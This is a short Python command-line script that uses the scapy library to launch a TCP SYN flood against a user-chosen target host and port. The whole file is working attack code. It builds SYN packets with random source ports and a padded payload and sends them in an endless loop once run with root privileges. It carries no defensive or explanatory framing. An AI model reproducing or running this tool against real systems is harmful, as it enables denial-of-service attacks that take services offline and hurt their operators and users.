#!/usr/bin/env python3

from os import geteuid
from datetime import date
from optparse import OptionParser
from colorama import Fore, Back, Style
from scapy.all import IP, TCP, Raw, RandShort, send
from time import strftime, localtime, time

status_color = {
	'+': Fore.GREEN,
	'-': Fore.RED,
	'*': Fore.YELLOW,
	':': Fore.CYAN,
	' ': Fore.WHITE,
}

def get_time():
	return strftime("%H:%M:%S", localtime())
def display(status, data):
	print(f"{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {get_time()}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}")

def get_arguments(*args):
	parser = OptionParser()
	for arg in args:
		parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
	return parser.parse_args()[0]

def check_root():
	return geteuid() == 0

def syn_flood(target, port, size):
	display(':', "Crafting IP Layer")
	ip_layer = IP(dst=target)
	display('+', "Done")
	display(':', "Crafting TCP Layer")
	tcp_layer = TCP(sport=RandShort(), dport=port, flags='S')
	display('+', "Done")
	display(':', "Making RAW Data")
	raw_data = Raw(b'X'*size)
	display('+', "Done")
	display(':', f"Crafting the Final Packet => {Back.MAGENTA}ip_layer / tcp_layer / raw_data{Back.RESET}")
	packet = ip_layer / tcp_layer / raw_data
	display('+', "Done")
	display('+', f"Flooding Packets to target {Back.MAGENTA}{target}{Back.RESET}:{Back.MAGENTA}{port}{Back.RESET}")
	send(packet, loop=1, verbose=0)

if __name__ == "__main__":
	data = get_arguments(('-t', "--target", "target", "Target to perform SYN Flooding Attack on"),
		      			 ('-p', "--port", "port", "Target Port to flood"),
						 ('-s', "--size", "size", "Size of Data that we want to send(in Bytes) (Default=1024 Bytes)"))
	if not data.target:
		display('-', "Please specify a target")
		exit(0)
	if not data.port:
		display('-', "Please specify a port")
		exit(0)
	else:
		try:
			data.port = int(data.port)
		except ValueError:
			display('-', "Please enter a valid port")
			exit(0)
	if not data.size:
		data.size = 1024
	else:
		data.size = int(data.size)
	if not check_root():
		display('-', f"This Program requires {Back.MAGENTA}root{Back.RESET} Privileges")
		exit(0)
	display('+', f"Starting SYN Flood Attack on {Back.MAGENTA}{data.target}{Back.RESET}:{Back.MAGENTA}{data.port}{Back.RESET}")
	syn_flood(data.target, data.port, data.size)